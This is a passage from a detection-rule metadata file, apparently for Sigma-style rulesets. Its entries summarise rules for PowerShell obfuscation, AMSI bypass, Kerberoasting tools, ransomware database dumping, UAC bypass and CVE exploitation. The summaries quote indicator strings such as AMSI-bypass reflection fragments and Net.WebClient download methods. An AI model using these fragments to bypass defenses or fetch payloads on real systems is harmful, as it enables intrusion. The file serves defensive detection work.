  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fd6d088615fd248e62f608064b9c13bf
  Ruleset: core
  Summary: This rule detects all variations of obfuscated PowerShell IEX (Invoke-Expression)
    invocation code generated by the Invoke-Obfuscation framework. The framework is
    commonly used to obscure PowerShell scripts to evade detection. The rule identifies
    specific patterns in the PowerShell payload, such as certain character sequences
    and variable manipulation techniques, commonly utilized by the Invoke-Obfuscation
    framework to create obfuscated strings. These patterns include the manipulation
    of environment variables and PowerShell properties, enabling detection of obfuscated
    PowerShell commands that attempt to execute malicious scripts undetected.
  Updated-Date: '2024_09_03'
2f47f1fd-0901-466e-a770-3b7092834a1b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8dd2d3e5091ff3e6163dee8b374694f0
  Ruleset: emerging-threats
  Summary: This rule detects potential Conti ransomware activity related to database
    dumping via SQLCmd. It specifically monitors for the execution of the 'sqlcmd.exe'
    tool and checks for command line arguments that include terms such as 'sqlcmd',
    'sqlcmd.exe', '-S localhost', 'sys.sysprocesses', 'master.dbo.sysdatabases', and
    'BACKUP DATABASE'. These terms indicate attempts to access and dump SQL databases,
    which is a known behavior of the Conti ransomware.
  Updated-Date: '2024_09_03'
2f575940-d85e-4ddc-af13-17dad6f1a0ef:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 19e221193489f0cde2608cbb55831d8d
  Ruleset: sigmahq
  Summary: This rule detects when there are changes to the SSH certificate configuration
    within a GitHub organization. This includes the creation of an SSH certificate
    authority for the organization or enterprise, as well as the disabling of the
    requirement for members to use SSH certificates to access the organization's resources.
  Updated-Date: '2024_09_04'
2f77047c-e6e9-4c11-b088-a3de399524cd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b591e4565dc50dcf4891a34befdcc6cb
  Ruleset: core
  Summary: This rule detects the usage of specific functions and keywords in PowerShell
    script blocks that manipulate security descriptors, potentially setting a backdoor.
    The functions include `win32_Trustee`, `win32_Ace`, and properties like `.AccessMask`,
    `.AceType`, and `.SetSecurityDescriptor`. Additionally, it identifies the presence
    of elements such as `\Lsa\JD`, `\Lsa\Skew1`, `\Lsa\Data`, and `\Lsa\GBG`. This
    behavior has been observed in the DAMP project, indicating tactics used for persistence,
    defense evasion, or privilege escalation.
  Updated-Date: '2024_09_03'
2f78da12-f7c7-430b-8b19-a28f269b77a3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f5624e0b10e5f5928a153c8a0a4c72e1
  Ruleset: sigmahq
  Summary: This rule detects attempts to tamper with the "Enabled" registry key to
    disable Windows event logging on a specified Windows event channel. It identifies
    modifications where the key value is set to 'DWORD (0x00000000)', indicating disabling
    of the event log. The rule filters out common legitimate processes such as 'wevtutil.exe'
    during installation of manifests, 'TiWorker.exe' from the Windows component store,
    'svchost.exe' for specific Windows features, and 'TrustedInstaller.exe' for compatibility
    assessments.
  Updated-Date: '2024_09_04'
2f7979ae-f82b-45af-ac1d-2b10e93b0baa:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 32144c61943cae6ae56714e200e52b99
  Ruleset: core
  Summary: This rule detects potential DLL hijacking of "iertutil.dll" in the DCOM
    InternetExplorer.Application Class over the network. DLL hijacking occurs when
    an attacker places a malicious DLL file named "iertutil.dll" in the directory
    from which the application is expected to load the legitimate DLL, enabling the
    attacker to execute arbitrary code. This activity can be indicative of lateral
    movement efforts by an attacker within a network.
  Updated-Date: '2024_09_03'
2f869d59-7f6a-4931-992c-cce556ff2d53:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 66c89ec4723b288d245583f52bce3b7c
  Ruleset: core
  Summary: This rule detects the execution of "AdPlus.exe," a binary included in the
    Windows Software Development Kit (SDK) that can be misused as a Living-Off-The-Land
    Binary (LOLBIN) for dumping process memory and executing arbitrary commands. Specific
    command line indicators associated with dumping process memory, using a configuration
    file, or executing commands inline are monitored to identify potential abuse of
    this binary. The binary's legitimate usage for debugging purposes is acknowledged
    as a possible false positive.
  Updated-Date: '2024_09_03'
2f8cd7a0-9d5a-4f62-9f8b-2c951aa0dd1f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cdad72c8597dd30a7d9d80f40fea6dd1
  Ruleset: core
  Summary: This rule detects loaded kernel modules on Windows that did not meet the
    Windows Hardware Quality Labs (WHQL) signing requirements, which is indicative
    of potential privilege escalation attempts. It triggers on specific event IDs
    (3082 and 3083) related to WHQL standard non-compliance, signaling that such modules
    have been permitted to load despite failing to meet these requirements. This scenario
    could expose the system to unverified or malicious kernel-level software. For
    specific known exceptions, such as VMware-related drivers, these are exempted
    from triggering this alert.
  Updated-Date: '2024_09_03'
2f9356ae-bf43-41b8-b858-4496d83b2acb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 15efca81b7950b3016a4467306da347f
  Ruleset: core
  Summary: This rule detects the creation of an ISO file within the Outlook temporary
    folder or the AppData temporary folder on a Windows system. This activity is typically
    associated with Qakbot's tactics, techniques, and procedures (TTP) observed from
    late July 2022. Qakbot is a form of malware known for its capabilities in banking
    credential theft and acting as a loader for other malware. The presence of an
    ISO file in these specific locations could indicate a Qakbot infection attempt,
    as it often involves the use of ISO files for malicious activity. However, there
    is potential for false positives, such as a system administrator opening a zip
    file that contains a legitimate ISO file.
  Updated-Date: '2024_09_03'
2f974656-6d83-4059-bbdf-68ac5403422f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 051d9b6974afe46d0f50281cd14feae8
  Ruleset: emerging-threats
  Summary: This rule detects process execution patterns indicative of Hermetic Wiper
    malware attacks. It identifies specific characteristics such as the execution
    of 'postgresql.exe' from the '\policydefinitions\' directory and command line
    arguments containing 'CSIDL_SYSTEM_DRIVE\temp\sys.tmp' or combinations of PowerShell
    commands involving 'comsvcs.dll MiniDump' and 'winupd.log'. These patterns are
    related to the Hermetic Wiper malware used in attacks against Ukraine in February
    2022, targeting lateral movement and execution stages within Windows process creation
    logs.
  Updated-Date: '2024_09_03'
2fade0b6-7423-4835-9d4f-335b39b83867:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 26b4992c95fb237c07c4b0eb2d84e814
  Ruleset: core
  Summary: This rule detects the execution of shell processes when the parent process
    is located in the temporary (/tmp) directory. It monitors for the initiation of
    various shells, including bash, csh, dash, fish, ksh, sh, and zsh, by verifying
    if the parent process image path starts with '/tmp/'. This behavior could indicate
    the presence of malware such as the GobRAT, which is known to use the /tmp directory
    for malicious activities.
  Updated-Date: '2024_09_03'
2fdefcb3-dbda-401e-ae23-f0db027628bc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2ed2b5a009b5606eacf83b0b4c1794aa
  Ruleset: core
  Summary: This rule detects the usage and installation of a backdoor that exploits
    the ability to register a malicious debugger for built-in tools accessible from
    the Windows login screen. Specifically, it targets processes initiated by 'winlogon.exe'
    that subsequently launch commands such as 'cmd.exe', 'cscript.exe', 'mshta.exe',
    'powershell.exe', 'pwsh.exe', 'regsvr32.exe', 'rundll32.exe', 'wscript.exe', or
    'wt.exe' with command lines containing 'sethc.exe', 'utilman.exe', 'osk.exe',
    'Magnify.exe', 'Narrator.exe', or 'DisplaySwitch.exe'. This activity is critical
    as it indicates potential privilege escalation and persistence mechanisms often
    associated with malicious exploitation.
  Updated-Date: '2024_09_03'
2fef4fd9-7206-40d1-b4f5-ad6441d0cd9b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4cb29c57c5b6affe1720e7853faaa28c
  Ruleset: emerging-threats
  Summary: This rule detects file creation activity that is indicative of Onyx Sleet
    APT operations, specifically focusing on instances where the target filename ends
    with ':\Windows\ADFS\bg\inetmgr.exe' on Windows systems. This filename pattern
    is associated with malicious actions linked to the Onyx Sleet Advanced Persistent
    Threat group. The rule aims to identify potentially malicious file operations
    that could signify exploitation or compromise attempts correlating with recent
    reported vulnerabilities and threat actor behaviors.
  Updated-Date: '2024_09_03'
2ff692c2-4594-41ec-8fcb-46587de769e0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e572a83f9ab470aa5160d695131c3f5d
  Ruleset: sigmahq
  Summary: This rule detects the disabling of CrashDump settings via the Windows registry,
    a tactic used by the HermeticWiper malware. The detection is focused on changes
    to the 'SYSTEM\CurrentControlSet\Control\CrashControl' registry path, specifically
    when the 'DWORD (0x00000000)' value is set, which indicates crashdumps are turned
    off.
  Updated-Date: '2024_09_04'
3007fec6-e761-4319-91af-e32e20ac43f5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bb290051a945c93cb3dcd057ab045a1f
  Ruleset: emerging-threats
  Summary: This rule detects the exploitation of a path normalization flaw in Apache
    HTTP Server version 2.4.49. The vulnerability, identified as CVE-2021-41773, allows
    an attacker to perform a path traversal attack, potentially accessing files outside
    the web server's document root. If these external files are not protected by "require
    all denied," such requests can succeed. This flaw can also expose the source code
    of interpreted files like CGI scripts. The issue is actively exploited in the
    wild and does not affect earlier versions of Apache.
  Updated-Date: '2024_09_03'
300bac00-e041-4ee2-9c36-e262656a6ecc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 47280cd00d41485b592473e831fde8f1
  Ruleset: core
  Summary: This rule detects scenarios in Windows Active Directory environments where
    one user or computer account can control another account without using its credentials.
    It identifies events related to delegation settings involving specific attributes
    such as `msDS-AllowedToDelegateTo`, `servicePrincipalName`, and `msDS-AllowedToActOnBehalfOfOtherIdentity`,
    which are manipulated to achieve unauthorized control. The detection is based
    on various Security Event IDs (4738 and 5136) and conditions that filter out empty
    or null attributes to pinpoint suspicious activities.
  Updated-Date: '2024_09_03'
304810ed-8853-437f-9e36-c4975c3dfd7e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 56d9fca28df3547a8ce137e3ba07d6cb
  Ruleset: core
  Summary: This rule detects specific communication patterns associated with the BabyShark
    Command and Control (C2) Framework. It identifies HTTP requests containing the
    string "momyshark?key=" in the URI, which is indicative of the default communication
    protocol used by the BabyShark malware. The detection of this pattern helps in
    identifying potential instances of the BabyShark malware attempting to establish
    a connection with its command and control server for malicious purposes.
  Updated-Date: '2024_09_03'
304afd73-55a5-4bb9-8c21-0b1fc84ea9e4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d2c0b3eb682c45bcf7ddecb8c3d687eb
  Ruleset: core
  Summary: This rule detects the creation of a PSEXEC key file, which occurs whenever
    a PsExec command is executed. The PsExec utility, often used for remote execution
    on Windows systems, saves this key file to the file system, which is then recorded
    in the USN Journal on the target system.
  Updated-Date: '2024_09_03'
30bcce26-51c5-49f2-99c8-7b59e3af36c7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6f60091301d9f3dbd0d2e57f3c47f0a3
  Ruleset: sigmahq
  Summary: This rule detects the execution of scripts located in potentially suspicious
    directories, such as "/tmp," through the use of various shell environments like
    "bash," "sh," "csh," "dash," "fish," "ksh," and "zsh." Monitoring for such script
    executions is crucial as these directories are often used by malware, such as
    GobRAT, to execute unauthorized or harmful activities on a Linux system. Specific
    command-line flags and paths are scrutinized to identify these suspicious script
    executions.
  Updated-Date: '2024_09_04'
30bf1789-379d-4fdc-900f-55cd0a90a801:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: affc4b7775de0cdf608096bbe8ef89af
  Ruleset: sigmahq
  Summary: This rule detects the installation of the Visual Studio Code Tunnel (code-tunnel)
    as a service on Windows systems. It monitors for specific commands related to
    the service installation, which include terms like 'tunnel', 'service', 'internal-run',
    and 'tunnel-service.log' in the command line. This may indicate either a legitimate
    setup or potential misuse for command-and-control activities.
  Updated-Date: '2024_09_04'
30d07da2-83ab-45d8-ae75-ec7c0edcaffc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 76c791312b3143cd9844c4be45ea6426
  Ruleset: sigmahq
  Summary: This rule detects the execution of a renamed BOINC binary. BOINC (Berkeley
    Open Infrastructure for Network Computing) is a platform for volunteer computing
    and can be exploited for malicious purposes when its executable is renamed. This
    detection attempts to identify such occurrences to prevent unauthorized or suspicious
    usage. The context includes references to BOINC's official site, a VirusTotal
    page detailing a specific file, and a blog post from Huntress discussing the use
    of fake browser updates to distribute BOINC software.
  Updated-Date: '2024_09_04'
30e92f50-bb5a-4884-98b5-d20aa80f3d7a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e6c54cd637834598d8852d74963746a6
  Ruleset: sigmahq
  Summary: This rule detects events triggered when a user clicks on a link file (.lnk)
    that contains a PowerShell command. It monitors for the process creation originating
    from `explorer.exe` and subsequently invoking `cmd.exe` with command lines that
    include 'powershell' and '.lnk'. This pattern can indicate a potentially malicious
    use of link files to execute hidden PowerShell commands.
  Updated-Date: '2024_09_04'
30edb182-aa75-42c0-b0a9-e998bb29067c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f5be7f484bfcfc2a9a0d95f364055e26
  Ruleset: core
  Summary: This rule detects attempts to bypass the Antimalware Scan Interface (AMSI)
    on Windows systems through the use of .NET reflection. It identifies command lines
    containing references to "System.Management.Automation.AmsiUtils" and "amsiInitFailed"
    or the combination of "[Ref].Assembly.GetType", "SetValue($null,$true)", and "NonPublic,Static".
    These patterns suggest that an attacker is trying to deactivate AMSI, which is
    a defense mechanism used to scan and block malicious code.
  Updated-Date: '2024_09_03'
30fc8de7-d833-40c4-96b6-28319fbc4f6c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7e42cd0f4d6028705766c9a3bb2b7f03
  Ruleset: core
  Summary: This rule detects attempts to bypass User Account Control (UAC) by leveraging
    the Event Viewer RecentViews. It monitors for command-line activities that reference
    Event Viewer paths associated with RecentViews, indicating potential abuse for
    elevating privileges.
  Updated-Date: '2024_09_03'
3109530e-ab47-4cc6-a953-cac5ebcc93ae:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1f1e02437220476e4ef43ed5781a9825
  Ruleset: sigmahq
  Summary: This rule detects the deletion of the "Zone.Identifier" Alternate Data
    Stream (ADS) by uncommon processes. Attackers can exploit this behavior to bypass
    security restrictions that rely on ADS, potentially affecting programs such as
    Microsoft Office applications. The detection mechanism focuses on identifying
    the deletion of files with the ":Zone.Identifier" suffix unless the action is
    performed by commonly known applications, including various PowerShell versions,
    Windows Explorer, Google Chrome, and Mozilla Firefox.
  Updated-Date: '2024_09_04'
311b6ce2-7890-4383-a8c2-663a9f6b43cd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fa0438fa917980d40fd51346c798eef3
  Ruleset: core
  Summary: This rule detects when a user is assigned the SeEnableDelegationPrivilege
    right in Active Directory, which grants them control over other Active Directory
    user objects.
  Updated-Date: '2024_09_03'
3121461b-5aa0-4a41-b910-66d25524edbb:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fccefbf918102d27fe9b201df47c6e93
  Ruleset: emerging-threats
  Summary: This rule detects specific process characteristics associated with the
    Winnti malware, particularly targeting a campaign against Hong Kong universities
    observed in December 2019 and January 2020. It identifies suspicious parent-child
    process relationships, such as processes originating from the `C:\Windows\Temp`
    directory or involving executables named `hpqhvind.exe`, `wmplayer.exe`, `CLR.exe`,
    and `SearchFilterHost.exe`. The rule focuses on identifying these processes when
    they follow specific directory paths like `C:\ProgramData\DRM`. The goal is to
    spot patterns indicating the presence of Winnti malware activities aimed at evading
    defenses and compromising systems.
  Updated-Date: '2024_09_03'
312b42b1-bded-4441-8b58-163a3af58775:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ade2763c0c6af29cb5cffcab5ae89eb6
  Ruleset: core
  Summary: This rule detects the execution of processes located in the '/tmp/' folder,
    which is potentially suspicious. Such activity can indicate the presence of malware
    like GobRAT, as it is common for malicious software to utilize temporary directories
    to evade detection and execution monitoring. The references highlight detailed
    analyses and examples of malware that exhibit this behavior.
  Updated-Date: '2024_09_03'
312d0384-401c-4b8b-abdf-685ffba9a332:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8800d3139a831173cf3a8217e14e64ac
  Ruleset: core
  Summary: This rule detects email exfiltration activities conducted via PowerShell
    cmdlets. It particularly monitors the usage of PowerShell and PowerShell Core
    (pwsh.exe) processes to identify commands that include actions like adding a PowerShell
    snap-in (`Add-PSSnapin`), retrieving recipient information (`Get-Recipient`),
    and extracting email properties (`-ExpandProperty EmailAddresses` and `SmtpAddress`).
    Such activities are indicative of potential data exfiltration where email addresses
    and SMTP information are being programmatically accessed and possibly exfiltrated
    from a system.
  Updated-Date: '2024_09_03'
3132570d-cab2-4561-9ea6-1743644b2290:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 932327b8356d74b8e532fc24c6273da4
  Ruleset: sigmahq
  Summary: This rule detects the deletion of events in Kubernetes, which may indicate
    an attempt by an adversary to evade detection. Such deletions can obscure evidence
    of malicious activity, thus hindering security monitoring efforts.
  Updated-Date: '2024_09_04'
313d6012-51a0-4d93-8dfc-de8553239e25:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0b8e1e7ab1cf390e718eb2983e63adcc
  Ruleset: sigmahq
  Summary: This rule detects the usage of the winget tool to install applications
    via a manifest file on Windows systems. Adversaries may exploit winget to download
    and execute payloads remotely. The manifest option in winget allows the installation
    of applications by passing a YAML file directly to the client. Winget can subsequently
    be used to download and install exe, msi, or msix files.
  Updated-Date: '2024_09_04'
313fbb0a-a341-4682-848d-6d6f8c4fab7c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2fe686ce3fe6e3b70ce0a5ff09bcb059
  Ruleset: sigmahq
  Summary: This rule detects the use of the PowerShell `WindowStyle` option set to
    `Hidden`, which may indicate an adversary's attempt to conceal malicious activity
    by running PowerShell scripts without displaying a window to the user. By examining
    the script block text for instances where this configuration is utilized, the
    rule aims to identify potentially suspicious behavior that avoids user detection.
  Updated-Date: '2024_09_04'
31545105-3444-4584-bebf-c466353230d2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0d945e886f1e3f9b7effb5889c0ff268
  Ruleset: sigmahq
  Summary: This rule detects the usage of the "touch" command in relation to service
    files in a Linux environment. The rule identifies instances where the "touch"
    command is used to alter timestamps on files with a ".service" extension, which
    may be indicative of defense evasion techniques. Such activity is often performed
    by administrators changing the date of files, but it can also be used by malicious
    actors to manipulate file timestamps and evade detection mechanisms.
  Updated-Date: '2024_09_04'
318557a5-150c-4c8d-b70e-a9910e199857:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6e877d798ce89d67262b1acdc1997ccd
  Ruleset: core
  Summary: This rule detects the creation of files by msdt.exe in suspicious directories,
    which may indicate the exploitation of the Follina or Dogwalk vulnerabilities.
    The suspicious directories include locations such as the Desktop, Start Menu Programs
    Startup, C:\PerfLogs\, C:\ProgramData\, and C:\Users\Public\. This could be a
    sign of unauthorized persistence mechanisms being employed.
  Updated-Date: '2024_09_03'
31c51af6-e7aa-4da7-84d4-8f32cc580af2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 95d411db2b6dcb700c2e65d6ff3755f9
  Ruleset: core
  Summary: This rule detects the installation of a known malicious service associated
    with the Sliver Command and Control (C2) framework, which is typically executed
    through PsExec commands. Sliver is an emerging C2 framework used by adversaries
    for executing commands remotely and controlling compromised systems. The rule
    monitors the 'Service Control Manager' for event ID 7045 and checks for image
    paths that match a specific pattern indicative of Sliver implants, as well as
    specific service names such as 'Sliver' or 'Sliver implant.'
  Updated-Date: '2024_09_03'
31d68132-4038-47c7-8f8e-635a39a7c174:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3bdfedaf695d25b6dc34ebae09dc041f
  Ruleset: sigmahq
  Summary: This rule detects potential Active Directory reconnaissance and enumeration
    activities conducted via LDAP searches on Windows systems. It identifies specific
    search filters and attributes commonly used for gathering information about domain
    controllers, groups, users, computer objects, and various organizational units
    within an Active Directory environment. The rule flags unusual or suspicious LDAP
    search patterns and distinguished names that suggest attempts to identify high-privilege
    groups like "Domain Admins" and "Enterprise Admins" or sensitive user account
    settings. Detecting these activities helps in identifying unauthorized or malicious
    attempts to map out the organization's directory infrastructure and user permissions,
    which is often a precursor to more targeted attacks.
  Updated-Date: '2024_09_04'
31e124fb-5dc4-42a0-83b3-44a69c77b271:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ed5566e2d264506c829c4d26a6380abf
  Ruleset: sigmahq
  Summary: This rule detects activity that indicates a user disabling the ability
    for an Antivirus mini filter to inspect a "Dev Drive" on a Windows system. The
    detection focuses on specific registry changes where the target object ends with
    `\FilterManager\FltmgrDevDriveAllowAntivirusFilter` and its details being set
    to a DWORD value of `0x00000000`. This action is commonly associated with defense
    evasion tactics.
  Updated-Date: '2024_09_04'
31e4e649-7394-4fd2-9ae7-dbc61eebb550:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c27098ce2ad2cd1225d943e2a0d7a42e
  Ruleset: emerging-threats
  Summary: This rule detects indicators of potential exploitation of CVE-2023-27997,
    a vulnerability in FortiGate firewall logs. It focuses on identifying successive
    requests to specific endpoints, such as '/remote/hostcheck_validate' and '/remote/logincheck',
    as well as unusual values of the "enc" parameter in both GET and POST requests.
  Updated-Date: '2024_09_03'
320fccbf-5e32-4101-82b8-2679c5f007c6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f26a69e6aadb805ea9f2da035e8db2c5
  Ruleset: core
  Summary: This rule detects the loading of a revoked kernel driver in a Windows environment.
    It identifies specific event IDs related to the Code Integrity mechanism that
    indicate a revoked kernel module has been loaded into the system, either normally
    or when a kernel mode debugger is attached. This potentially signifies a risk
    of privilege escalation, emphasizing the need to check with the module's publisher
    for a new, signed version. The detection level is considered high, and false positives
    are deemed unlikely.
  Updated-Date: '2024_09_03'
3215aa19-f060-4332-86d5-5602511f3ca8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4febf17c2cde7ed8c265d3ff08c2ba3f
  Ruleset: sigmahq
  Summary: This rule detects the creation of files that use "LNK" as a second extension,
    which can signify attempts by malware to exploit the fact that Windows hides the
    "LNK" extension by default. This technique is often used to disguise malicious
    files by adding harmless-looking extensions such as ".doc", ".docx", ".jpg", ".pdf",
    ".ppt", ".pptx", ".xls", or ".xlsx" before the "LNK" extension, making the file
    appear benign. Filters are applied to exclude legitimate cases of recent documents
    in specific directories like Microsoft Office Recent folders. The rule aims to
    identify potentially harmful double-extension LNK files while reducing false positives
    by refining conditions based on file paths typical to normal application usage.
  Updated-Date: '2024_09_04'
322ed9ec-fcab-4f67-9a34-e7c6aef43614:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a7e7f339c2e4a379e2b2261bfc93d72f
  Ruleset: sigmahq
  Summary: This rule detects the execution of netsh.exe commands that configure new
    port forwarding (PortProxy) rules on Windows systems. The detection focuses on
    command lines containing specific parameters indicative of portproxy configurations,
    such as 'interface,' 'portproxy,' 'add,' 'v4tov4,' 'connectp,' and 'listena.'
    These commands are often associated with network configuration changes that could
    facilitate lateral movement, defense evasion, and command-and-control activities
    within a network. The detection logic aims to identify potentially malicious activity
    while considering certain legitimate administrative actions as possible false
    positives.
  Updated-Date: '2024_09_04'
3236fcd0-b7e3-4433-b4f8-86ad61a9af2d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dc223d45d0dadce769343c73c496346f
  Ruleset: sigmahq
  Summary: This rule detects suspicious PowerShell commands indicative of a download
    operation using `Net.WebClient`. It focuses on identifying instances where methods
    such as `.DownloadFile` or `.DownloadString` are utilized within PowerShell scripts,
    as these behaviors can signify attempts to download potentially malicious content
    from the internet.
  Updated-Date: '2024_09_04'
323ff3f5-0013-4847-bbd4-250b5edb62cc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d1339a9c22bae6c74603af0fb5850957
  Ruleset: sigmahq
  Summary: This rule detects the removal of system firewall rules, which can indicate
    that an adversary is attempting to bypass network usage or access controls by
    deleting or modifying specific firewall settings. The rule monitors commands such
    as 'iptables' with parameters containing 'DROP', 'firewall-cmd' with 'remove',
    and 'ufw' with 'delete'. These activities could represent attempts to disable
    firewall protections on a Linux system. While there may be legitimate administrative
    reasons for these actions, they could also signify a security threat.
  Updated-Date: '2024_09_04'
32410e29-5f94-4568-b6a3-d91a8adad863:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4cd243f026723bf11b7dea0a089465c0
  Ruleset: core
  Summary: This rule detects the execution of Fast Reverse Proxy (FRP) software, which
    is designed to expose a local server behind NAT or firewall to the internet. It
    identifies the usage of specific executables associated with FRP (`frpc.exe` and
    `frps.exe`) and command lines containing the `frpc.ini` configuration file. Additionally,
    the rule matches known hashes of the FRP executable files.
  Updated-Date: '2024_09_03'
32438676-1dba-4ac7-bf69-b86cba995e05:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 14935cbf34c1779f137c411e2d5744d0
  Ruleset: sigmahq
  Summary: This rule detects the deletion of access policies applied to Google Cloud
    Platform (GCP) resources. Access policies can be removed by adversaries to obtain
    unauthorized access to these cloud resources.
  Updated-Date: '2024_09_04'
3245cd30-e015-40ff-a31d-5cadd5f377ec:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 40bd9034672309949da51932eae633a4
  Ruleset: core
  Summary: This rule detects the execution of the hacktool Rubeus by identifying specific
    command line flags within PowerShell script blocks. Rubeus is a tool used for
    Kerberos-related attacks, including ASREPRoasting, Kerberoasting, ticket requests,
    and ticket manipulation. The rule focuses on keywords and parameters such as 'asreproast',
    'kerberoast', 'createnetonly', 'ptt /ticket', and other related strings that indicate
    the use of Rubeus for credential access and lateral movement activities. Script
    Block Logging must be enabled to utilize this detection method.
  Updated-Date: '2024_09_03'
3268b746-88d8-4cd3-bffc-30077d02c787:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c735b32291f3e2423d9b8ac502f1f201
  Ruleset: core
  Summary: This rule detects certain Empire PowerShell User Account Control (UAC)
    bypass methods used for privilege escalation and defense evasion. Empire is a
    popular post-exploitation framework that facilitates the execution of various
    malicious activities on compromised systems. The detection focuses on specific
    PowerShell command-line patterns associated with UAC bypass techniques. These
    observed patterns involve commands that suppress PowerShell prompts, invoke hidden
    Windows updates, and manipulate user settings to escalate privileges. The rule
    scrutinizes process creation logs to identify these potentially malicious activities
    in a Windows environment.
  Updated-Date: '2024_09_03'
327f48c1-a6db-4eb8-875a-f6981f1b0183:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 29a66bd8ec21890a3545044bb84f8b36
  Ruleset: sigmahq
  Summary: This rule detects port forwarding activity initiated through SSH.exe on
    Windows systems. Specifically, it identifies instances where the SSH.exe process
    is accompanied by command-line arguments that include ' -R ', which typically
    indicates reverse port forwarding. This behavior can be indicative of command-and-control
    techniques or lateral movement within a network. While administrative tasks may
    sometimes involve such commands, this activity warrants further investigation
    to rule out malicious intent.
  Updated-Date: '2024_09_04'
327ff235-94eb-4f06-b9de-aaee571324be:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6a4fe0001c4c16be5e01b796405931a2
  Ruleset: core
  Summary: This rule detects the execution of `regsvr32.exe`, a legitimate Windows
    utility often used to register and unregister DLLs, from highly suspicious directory
    locations that are typically not used for legitimate DLL files. The monitored
    directories include paths within `\PerfLogs\`, `\Temp\`, and various subdirectories
    under `\Windows\System32` and `\Windows\SysWOW64`, among others. This detection
    is indicative of potential malicious activity as attackers sometimes use `regsvr32.exe`
    to execute malicious scripts or DLLs from unconventional locations to evade security
    defenses. The rule excludes known legitimate directories such as `C:\Program Files\`,
    `C:\ProgramData\`, and user directories to reduce false positives.
  Updated-Date: '2024_09_03'
32b5db62-cb5f-4266-9639-0fa48376ac00:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1ea87463f1ddeed2902fdab6f751bca6
  Ruleset: emerging-threats
  Summary: This rule detects specific exploitation patterns related to Windows vulnerabilities
    CVE-2021-31979 and CVE-2021-33771, as well as the presence of the DevilsTongue
    malware, which has been linked to the threat group Sourgum. The rule identifies
    suspicious modifications in the Windows registry, particularly changes to CLSID
